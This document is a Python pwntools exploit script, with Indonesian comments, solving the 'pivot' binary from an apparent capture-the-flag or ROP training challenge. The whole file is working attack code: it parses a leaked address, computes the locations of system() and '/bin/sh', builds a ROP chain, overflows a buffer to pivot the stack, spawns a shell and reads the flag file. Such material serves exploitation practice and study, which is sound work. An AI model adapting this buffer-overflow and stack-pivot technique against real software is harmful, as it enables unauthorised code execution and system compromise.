#!/usr/bin/env python3

from pwn import *

TARGET = './pivot'
HOST = ''
PORT = 1337

elf = ELF(TARGET)
libpivot = ELF('./libpivot.so', checksec=False)

context.arch = 'amd64'
gdb_script = f"""
  # b *main
  b *pwnme+4
  # b *pwnme+108
  b *pwnme+165
  c
  c
"""
# context.log_level = 'DEBUG'

if args.GDB:
  context.terminal = ['wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc']
  p = gdb.debug(TARGET, gdbscript=gdb_script)
elif not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

# ===================================== #

# Exploit dimulai disini...

# Parse stack pivot leak #
p.recvuntil(b'place to pivot: ')
stack_pivot_leak = int(p.recvline()[:-1], 16)
system = stack_pivot_leak + 0x4d580
binsh = stack_pivot_leak + 0x198121
print(f"stack pivot leak: {hex(stack_pivot_leak)}")
print(f"system(): {hex(system)}")
print(f"/bin/sh: {hex(binsh)}")
# ========== #

# ROP gadget #
pop_rdi = 0x400a33
ret = 0x400a35
pwnme = elf.sym.pwnme
print(f"pwnme: {hex(pwnme)}")
# ========== #

# Stack pivot #
new_stack = stack_pivot_leak

# Siapin rop chain di stack yang baru
pivot_payload = p64(0xdeadbeef) * 1 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendlineafter(b'> ', pivot_payload)

# overflow dan ubah RBP ke lokasi/address stack yang baru
payload = p64(0xcafebabe) * 4 + p64(new_stack) + p64(ret) * 2 + p64(pwnme + 148)
p.sendlineafter(b'> ', payload)
# ========== #

sleep(0.5)
p.sendline(b'ls')
p.sendline(b'cat flag*')

p.interactive()

# NOTE:
# Stack pivot
